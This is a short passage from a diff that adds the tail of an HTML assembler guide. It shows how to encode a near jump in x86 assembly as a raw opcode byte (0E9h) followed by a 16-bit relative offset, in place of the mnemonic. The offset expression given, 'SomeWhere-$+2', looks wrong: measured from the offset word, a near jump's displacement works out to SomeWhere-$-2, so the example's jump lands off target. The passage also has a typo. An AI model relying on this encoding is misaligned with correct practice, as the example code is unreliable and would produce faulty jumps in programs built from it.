+method to get around this is to put the opcodes directly into the source code, 
+instead of using their mnemonics. Fro example, instead of: 
+<P> 
+<PRE>
+	jmp	near SomeWhere			;
+</PRE>
+You should put: 
+<PRE>
+	db	0E9h				; OpCode
+	dw	SomeWhere-$+2			; 16-bit relative offset
+</PRE>
+<HR>
+<CENTER>
+  <A HREF="mphguide.htm">Contents</A> 
+</CENTER>
+
+</BODY></HTML>
+
